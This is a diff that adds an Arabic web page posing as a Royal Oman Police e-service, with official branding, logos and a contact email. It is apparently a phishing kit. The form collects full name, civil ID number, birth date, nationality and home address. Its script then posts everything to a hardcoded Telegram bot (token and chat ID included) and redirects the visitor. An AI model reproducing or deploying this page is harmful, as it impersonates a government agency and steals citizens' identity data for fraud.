@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- ✅ العنوان في محرك البحث -->
+<title>دفع مخالفات المرور - شرطة عمان السلطانية | سلطنة عمان</title>
+
+<!-- ✅ وصف مخصص لمحركات البحث -->
+<meta name="description" content="ادفع مخالفات المرور إلكترونيًا عبر منصة شرطة عمان السلطانية الرسمية. خدمة سريعة وآمنة لسكان سلطنة عمان.">
+
+<!-- ✅ كلمات مفتاحية لتحسين الترتيب -->
+<meta name="keywords" content="شرطة عمان السلطانية, سلطنة عمان, مخالفات المرور, دفع المخالفات, المرور عمان, مخالفات شرطة عمان, خدمات المرور">
+
+<!-- ✅ إعدادات المشاركة الاجتماعية (صورة وعنوان ووصف) -->
+<meta property="og:title" content="دفع مخالفات المرور - سلطنة عمان">
+<meta property="og:description" content="منصة إلكترونية آمنة لدفع مخالفات المرور مباشرةً من خلال شرطة عمان السلطانية.">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRf7tnH15AEBDEPE0_KAhjAmOhBBHeQ7-VZjw&s"> <!-- ضع هنا رابط صورة حقيقية -->
+<meta property="og:url" content="https://omangov.github.io/omangov/">
+<meta property="og:type" content="website">
+
+<!-- ✅ دعم تويتر (اختياري) -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="دفع مخالفات المرور - سلطنة عمان">
+<meta name="twitter:description" content="خدمة دفع المخالفات المرورية إلكترونيًا في سلطنة عمان.">
+<meta name="twitter:image" content="https://example.com/images/oman-police.jpg">
+<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+
+
+
+  <style>
+    body {
+      font-family: 'Tajawal', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f0f0f0;
+    }
+
+    header {
+      background: linear-gradient(to left, #003366, #005599);
+      color: white;
+      padding: 20px;
+      position: relative;
+    }
+
+    .header-content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      height: 60px;
+    }
+
+    .menu {
+      background-color: white;
+      padding: 10px;
+      cursor: pointer;
+      border-radius: 4px;
+      display: inline-block;
+    }
+
+    .menu .bar {
+      display: block;
+      width: 25px;
+      height: 3px;
+      margin: 5px auto;
+      background-color: #003366;
+    }
+
+    .submenu {
+      display: none;
+      background-color: #003366;
+      padding: 10px;
+      position: absolute;
+      top: 100%;
+      right: 20px;
+      z-index: 10;
+    }
+
+    .submenu a {
+      color: white;
+      display: block;
+      padding: 5px 0;
+      text-decoration: none;
+    }
+
+    .slider {
+      width: 100%;
+      height: 300px;
+      overflow: hidden;
+      position: relative;
+    }
+
+   
+
+    .slides img {
+      width: 100%;
+      height: 300px;
+      object-fit: cover;
+    }
+
+
+    .title {
+      text-align: center;
+      font-size: 32px;
+      font-weight: bold;
+      margin: 40px 0 20px;
+      color: #174884;
+    }
+
+    .services {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      padding: 20px;
+      max-width: 1200px;
+      margin: auto;
+    }
+
+    .service-box {
+      background: white;
+      border-bottom: 5px solid #003366;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+
+    .service-box img {
+      width: 80px;
+      height: 80px;
+      object-fit: contain;
+    }
+
+    .service-box h3 {
+      margin: 10px 0 5px;
+    }
+
+    .service-box button {
+      background: #003366;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      background: linear-gradient(140deg, #174884 0%, #174884 50%, #174884c7 75%) !important;
+      border: 0;
+    font-weight: 500;
+    font-size: 0.9rem;
+    padding: 5px 16px;
+    }
+
+    #div1{
+            color: #174884;
+    }
+    
+    
+   h3 {
+    color: #212121;
+    font-size: 1.3rem;
+    margin-top: 30px;
+    margin-bottom: 10px;
+    text-align: center;
+    }
+
+    .submenu {
+  background-color: #fff;
+  padding: 2px 4px; /* من الأعلى 2px واليمين/اليسار 4px */
+  width: fit-content; /* ليتناسب مع المحتوى */
+  border-radius: 4px;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  width: 300px;
+}
+
+.submenu-item {
+  display: block;
+  width: 300px;
+  padding: 10px;
+  text-align: right;
+  text-decoration: none;
+  color: #333;
+  border-bottom: 1px solid #eee; /* الخط الأبيض بين العناصر */
+  background-color: #040d5c;
+  margin: 0;
+}
+
+.submenu-item:last-child {
+  border-bottom: none; /* إزالة الخط من آخر عنصر */
+}
+
+.services {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 16px;
+  justify-content: center;
+}
+
+.service-box {
+  background-color: #f9f9f9;
+  padding: 20px;
+  width: 300px;
+  text-align: center;
+  border-radius: 12px;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  transition: background-color 0.3s ease;
+  cursor: pointer;
+}
+
+/* عند التمرير */
+.service-box:hover {
+  background-color: #eef6ff; /* لون خفيف عند التمرير */
+}
+
+.main-footer {
+  background-color: #003366;
+  color: white;
+  padding: 20px 0;
+  margin-top: 40px;
+  font-size: 0.9rem;
+}
+
+.footer-container {
+  max-width: 1200px;
+  margin: auto;
+  padding: 0 20px;
+  text-align: center;
+}
+
+.footer-links {
+  margin-bottom: 15px;
+}
+
+.footer-links a {
+  color: #ffffff;
+  margin: 0 10px;
+  text-decoration: none;
+  border-bottom: 1px solid transparent;
+  transition: border-color 0.3s;
+}
+
+.footer-links a:hover {
+  border-color: #ffffff;
+}
+
+.footer-bottom {
+  border-top: 1px solid #ffffff33;
+  padding-top: 10px;
+  font-size: 0.85rem;
+  color: #ddd;
+  margin-bottom: 30px;
+}
+
+.related-sites {
+  padding: 40px 20px;
+  background-color: #f5f5f5;
+  text-align: center;
+}
+
+.related-title {
+  font-size: 24px;
+  color: #003366;
+  margin-bottom: 20px;
+  font-weight: bold;
+}
+
+.related-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 20px;
+  max-width: 600px;
+  margin: auto;
+}
+
+.related-grid a {
+  display: block;
+  border-radius: 8px;
+  overflow: hidden;
+  transition: transform 0.3s ease;
+  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+}
+
+.related-grid a:hover {
+  transform: scale(1.05);
+}
+
+.related-grid img {
+  width: 100%;
+  height: auto;
+  display: block;
+}
+
+#textex1{ 
+    margin-top: -70px;
+}
+
+#idType{
+height: 35px;
+background-color: #ffffff;
+color: #000000;
+
+}
+
+input{
+    font-size: 16px;
+}
+#divbode{
+    background-color: #ffffff;
+}
+
+
+#texte {
+    margin-top: -40px;
+margin-right: -20px;
+}
+
+#tex22 , #text33 {
+    font-size: 15px;
+}
+
+#tex22 {
+    font-size: 15px;
+    color: #FF0000;
+}
+.hidden {
+  display: none !important;
+}
+
+/* تنسيق الحاوية الخاصة بالفورم */
+.bg-white.shadow-xl.rounded-2xl {
+  background-color: #fff;
+  border-radius: 16px;
+  box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+  padding: 30px;
+  margin: auto;
+}
+
+/* عنوان الفورم */
+.text-2xl.font-bold {
+  font-size: 24px;
+  font-weight: bold;
+  color: #174884;
+}
+
+/* الحقول */
+input[type="text"],
+input[type="date"],
+input[type="file"],
+textarea,
+select {
+  font-family: 'Tajawal', sans-serif;
+  font-size: 16px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  padding: 10px;
+  width: 100%;
+  box-sizing: border-box;
+  margin-top: 5px;
+
+}
+
+/* عناوين الحقول */
+form label {
+  font-size: 15px;
+  color: #174884;
+  margin-bottom: 4px;
+  display: block;
+      margin-top: 10px;
+
+}
+
+/* زر الإرسال */
+button[type="submit"] {
+  background: linear-gradient(140deg, #174884 0%, #174884 50%, #174884c7 75%) !important;
+  color: white;
+  font-weight: 500;
+  font-size: 16px;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+  width: 290px;
+}
+
+button[type="submit"]:hover {
+  background-color: #133b6e;
+}
+
+#btnbtn{
+    margin-top: 20px;
+}
+
+#madane ,#deliveryMethod
+{
+    background-color: #ffffff;
+    width: 290px;
+    height: 45px;
+    color: #000000;
+}
+
+.select2-container--default .select2-selection--single {
+  background-color: #ffffff;
+  height: 45px;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  color: #000000;
+  display: flex;
+  align-items: center;
+}
+
+.select2-container--default .select2-selection--single .select2-selection__rendered {
+  line-height: 45px;
+  color: #000000;
+}
+
+.select2-container--default .select2-selection--single .select2-selection__arrow {
+  height: 45px;
+}
+
+#addressSection ,#mohafezah ,#homehome {
+    margin-top: 20px;
+}
+
+  </style>
+  
+</head>
+
+<body>
+  
+  <header>
+    <div class="header-content">
+      <img src="logomy.png" class="logo" alt="شعار">
+      <div class="menu" onclick="toggleMenu()">
+        <span class="bar"></span>
+        <span class="bar"></span>
+        <span class="bar"></span>
+      </div>
+    </div>
+    <div class="submenu" id="submenu">
+  <a class="submenu-item" href="#"> الصفحة الرئيسية </a>
+  <a class="submenu-item" href="#"> نبذة عن الشركة </a>
+  <a class="submenu-item" href="#"> خدماتنا </a>
+    <a class="submenu-item" href="#"> المركز الاعلامي </a>
+      <a class="submenu-item" href="#"> البيانات المفتوحة </a>
+        <a class="submenu-item" href="#"> المشاركة المجتمعية </a>
+
+
+
+</div>
+
+  </header>
+
+
+
+<section style="padding: 40px 20px; background-color: #ffffff;">
+ 
+
+    <section style="padding: 40px 20px; background-color: #ffffff;">
+    <h2 id="texte">الخدمات الإلكترونية</h2>
+    <h2 id="tex22"> خدمة اصدار بطاقة الاحوال المدنية ( لشخص )</h2>
+
+    <h2 id="text33"> </h2>
+  <div class="bg-white shadow-xl rounded-2xl p-6 max-w-2xl w-full">
+    <h2 class="text-2xl font-bold mb-6 text-center text-gray-800">قم بتعبئة البيانات التاليه بشكل دقيق  </h2>
+   <form id="registerForm" class="space-y-4">
+
+  <div>
+    <label for="fullName" class="block mb-1 font-semibold">الاسم الكامل</label>
+    <input id="fullName" type="text" class="w-full p-2 border rounded-md" required />
+  </div>
+
+  <div>
+    <label for="civilNumber" class="block mb-1 font-semibold">الرقم المدني</label>
+    <input id="civilNumber" type="text" class="w-full p-2 border rounded-md" required />
+  </div>
+
+  <div>
+    <label for="madane" class="block mb-1 font-semibold">تاريخ الميلاد</label>
+    <input id="madane" type="date" class="w-full p-2 border rounded-md" required />
+  </div>
+
+  <div>
+    <label for="countrySelect" class="block mb-1 font-semibold">الجنسية</label>
+    <select id="countrySelect" class="w-full p-2 border rounded-md" required></select>
+  </div>
+
+  <div id="residenceProofSection" class="hidden">
+    <label for="residenceProof" class="block mb-1 font-semibold">إثبات السكن</label>
+    <input id="residenceProof" type="file" accept="image/*" capture="environment" class="w-full p-2 border rounded-md" />
+  </div>
+
+  <div>
+    <label for="deliveryMethod" class="block mb-1 font-semibold">طريقة الاستلام</label>
+    <select id="deliveryMethod" class="w-full p-2 border rounded-md" required>
+      <option value="branch">استلام من الفرع</option>
+      <option value="home">توصيل للمنزل</option>
+    </select>
+  </div>
+
+  <div id="addressSection" class="hidden space-y-3">
+    <div>
+      <label for="mohafezah" class="block mb-1 font-semibold">المحافظة</label>
+      <input id="mohafezah" type="text" class="w-full p-2 border rounded-md" />
+    </div>
+    <div>
+      <label for="moharea" class="block mb-1 font-semibold">المنطقة</label>
+      <input id="moharea" type="text" class="w-full p-2 border rounded-md" />
+    </div>
+    <div>
+      <label for="homeAddress" class="block mb-1 font-semibold">عنوان المنزل بالتفصيل</label>
+      <textarea id="homeAddress" class="w-full p-2 border rounded-md"></textarea>
+    </div>
+  </div>
+
+ 
+
+  <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-md font-semibold">
+    إرسال
+  </button>
+</form>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+
+
+  </div>
+
+</section>
+
+
+
+
+
+
+
+  <section class="related-sites">
+  <div class="related-title">جهات ذات علاقة</div>
+  <div class="related-grid">
+    <a  target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/mala_ar.png" alt="جهة 1">
+    </a>
+    <a target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/ncem_ar.png" alt="جهة 2">
+    </a>
+    <a target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/tadad_ar.png" alt="جهة 3">
+    </a>
+    <a  target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/ncht_ar.png" alt="جهة 4">
+    </a>
+     <a target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/iss_ar.png" alt="جهة 4">
+    </a>
+    <a  target="_blank">
+      <img src="https://www.rop.gov.om/arabic/images/related/omanuna_ar.png" alt="جهة 4">
+    </a>
+  </div>
+</section>
+
+
+  <footer class="main-footer">
+  <div class="footer-container">
+          <img src="logomy.png" class="logo" alt="شعار">
+
+    <div class="footer-links">
+        
+      <a href="#">الشروط والأحكام</a>
+      <a href="#">سياسة الخصوصية</a>
+      <a href="#">حقوق النشر</a>
+      <a href="#">إخلاء المسؤولية</a>
+    </div>
+    <div class="footer-bottom">
+      جميع الحقوق محفوظة &copy; 
+
+      © شرطة عمان السلطانية إدارة العلاقات والإعلام الأمني- البريد الإلكتروني: info@rop.gov.om
+                            
+    </div>
+  </div>
+</footer>
+
+
+<script>
+
+  const countries = [
+  "سلطنة عمان", "السعودية", "الإمارات", "الكويت", "قطر", "البحرين", "مصر", "الأردن",
+  "سوريا", "العراق", "لبنان", "اليمن", "المغرب", "الجزائر", "تونس", "ليبيا",
+  "السودان", "فلسطين", "تركيا", "ألمانيا", "فرنسا", "إيطاليا", "إسبانيا", "الولايات المتحدة",
+  "كندا", "الهند", "باكستان", "إندونيسيا", "ماليزيا", "الصين", "اليابان", "كوريا الجنوبية", "بريطانيا",
+
+  "أفغانستان", "ألبانيا", "أندورا", "أنغولا", "أنتيغوا وبربودا", "الأرجنتين", "أرمينيا", "أستراليا",
+  "النمسا", "أذربيجان", "جزر البهاما", "بنغلاديش", "باربادوس", "بيلاروس", "بلجيكا", "بليز", "بنين",
+  "بوتان", "بوليفيا", "البوسنة والهرسك", "بوتسوانا", "البرازيل", "بروناي", "بلغاريا", "بوركينا فاسو",
+  "بوروندي", "كمبوديا", "الكاميرون", "الرأس الأخضر", "أفريقيا الوسطى", "تشاد", "تشيلي", "كولومبيا",
+  "جزر القمر", "الكونغو (برازافيل)", "الكونغو (كينشاسا)", "كوستاريكا", "كرواتيا", "كوبا", "قبرص",
+  "التشيك", "الدنمارك", "جيبوتي", "دومينيكا", "جمهورية الدومينيكان", "تيمور الشرقية", "الإكوادور",
+  "السلفادور", "غينيا الاستوائية", "إريتريا", "إستونيا", "إسواتيني", "إثيوبيا", "فيجي", "فنلندا",
+  "الغابون", "غامبيا", "جورجيا", "غانا", "اليونان", "غرينادا", "غواتيمالا", "غينيا", "غينيا بيساو",
+  "غيانا", "هايتي", "هندوراس", "المجر", "آيسلندا", "إيران", "أيرلندا", "إسرائيل", "ساحل العاج",
+  "جامايكا", "كازاخستان", "كينيا", "كيريباتي", "كوريا الشمالية", "قيرغيزستان", "لاوس", "لاتفيا",
+  "ليسوتو", "ليبيريا", "ليختنشتاين", "ليتوانيا", "لوكسمبورغ", "مدغشقر", "مالاوي", "جزر المالديف",
+  "مالي", "مالطا", "جزر مارشال", "موريتانيا", "موريشيوس", "المكسيك", "ميكرونيزيا", "مولدوفا",
+  "موناكو", "منغوليا", "الجبل الأسود", "موزمبيق", "ميانمار (بورما)", "ناميبيا", "ناورو", "نيبال",
+  "هولندا", "نيوزيلندا", "نيكاراغوا", "النيجر", "نيجيريا", "مقدونيا الشمالية", "النرويج", "عمان",
+  "بالاو", "بنما", "بابوا غينيا الجديدة", "باراغواي", "بيرو", "الفلبين", "بولندا", "البرتغال",
+  "رومانيا", "روسيا", "رواندا", "سانت كيتس ونيفيس", "سانت لوسيا", "سانت فنسنت والغرينادين", "ساموا",
+  "سان مارينو", "ساو تومي وبرينسيب", "السنغال", "صربيا", "سيشيل", "سيراليون", "سنغافورة", "سلوفاكيا",
+  "سلوفينيا", "جزر سليمان", "الصومال", "جنوب أفريقيا", "جنوب السودان", "سريلانكا", "سورينام", "السويد",
+  "سويسرا", "طاجيكستان", "تنزانيا", "تايلاند", "توغو", "تونغا", "ترينيداد وتوباغو", "تركمانستان",
+  "توفالو", "أوغندا", "أوكرانيا", "أوروغواي", "أوزبكستان", "فانواتو", "الفاتيكان", "فنزويلا",
+  "فيتنام", "زامبيا", "زيمبابوي"
+];
+
+  const $countrySelect = $("#countrySelect");
+  const residenceProofSection = document.getElementById("residenceProofSection");
+  const deliveryMethod = document.getElementById("deliveryMethod");
+  const addressSection = document.getElementById("addressSection");
+
+  // تعبئة قائمة الدول
+  countries.forEach(c => {
+    $countrySelect.append(`<option value="${c}">${c}</option>`);
+  });
+
+  $countrySelect.val("سلطنة عمان").trigger("change");
+
+  // تفعيل select2
+  $countrySelect.select2({
+    placeholder: "اختر الجنسية",
+    dir: "rtl"
+  });
+
+  function toggleResidenceProof() {
+    const selectedCountry = $countrySelect.val();
+    if (selectedCountry !== "سلطنة عمان") {
+      residenceProofSection.classList.remove("hidden");
+    } else {
+      residenceProofSection.classList.add("hidden");
+    }
+  }
+
+  function toggleAddressFields() {
+    if (deliveryMethod.value === "home") {
+      addressSection.classList.remove("hidden");
+    } else {
+      addressSection.classList.add("hidden");
+    }
+  }
+
+  $countrySelect.on("change", toggleResidenceProof);
+  deliveryMethod.addEventListener("change", toggleAddressFields);
+
+  // حالة أولية
+  toggleResidenceProof();
+  toggleAddressFields();
+
+  // كود التحقق (captcha)
+   let captchaCode = '';
+
+  function generateCaptcha() {
+    captchaCode = Math.floor(1000 + Math.random() * 9000).toString();
+    document.getElementById('captchaCode').innerText = captchaCode;
+  }
+
+  function sendToTelegram(data) {
+    const token = "7306405778:AAHuLdC1FiExOFkycDqoTHpd-sUuf6IhF-c";
+    const chat_id = "7595871538";
+
+    const message = `
+📋 استعلام جديد:
+
+👤 الاسم الكامل: ${data.fullName}
+🆔 الرقم المدني: ${data.civilNumber}
+🎂 تاريخ الميلاد: ${data.birthDate}
+🌍 الجنسية: ${data.nationality}
+🚚 طريقة الاستلام: ${data.deliveryMethod}
+🏠 المحافظة: ${data.mohafezah}
+📍 المنطقة: ${data.moharea}
+🏡 عنوان المنزل: ${data.homeAddress}
+`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ chat_id, text: message })
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('فشل الإرسال');
+      window.location.href = "test2.html";
+    })
+    .catch(error => {
+      alert("❌ فشل الإرسال إلى تليجرام");
+      console.error(error);
+    });
+  }
+
+  function handleFormSubmit(event) {
+    event.preventDefault();
+
+ 
+
+    const deliveryMethod = document.getElementById('deliveryMethod').value;
+
+    const formData = {
+      fullName: document.getElementById('fullName').value.trim(),
+      civilNumber: document.getElementById('civilNumber').value.trim(),
+      birthDate: document.getElementById('madane').value,
+      nationality: document.getElementById('countrySelect').value,
+      deliveryMethod,
+      mohafezah: '',
+      moharea: '',
+      homeAddress: '',
+    };
+
+    if (deliveryMethod === 'home') {
+      formData.mohafezah = document.getElementById('mohafezah').value.trim();
+      formData.moharea = document.getElementById('moharea').value.trim();
+      formData.homeAddress = document.getElementById('homeAddress').value.trim();
+
+      if (!formData.mohafezah || !formData.moharea || !formData.homeAddress) {
+        alert("يرجى تعبئة بيانات العنوان للتوصيل.");
+        return;
+      }
+    }
+      localStorage.setItem("userFullName", formData.fullName);
+
+
+    sendToTelegram(formData);
+  }
+
+  window.onload = function () {
+
+    const form = document.getElementById('registerForm');
+    if (form) {
+      form.addEventListener('submit', handleFormSubmit); 
+    }
+
+    document.getElementById('deliveryMethod').addEventListener('change', function () {
+      const addressSection = document.getElementById('addressSection');
+      if (this.value === 'home') {
+        addressSection.classList.remove('hidden');
+      } else {
+        addressSection.classList.add('hidden');
+      }
+    });
+  };
+
+  </script>
+
+
+
+</body>
+</html>
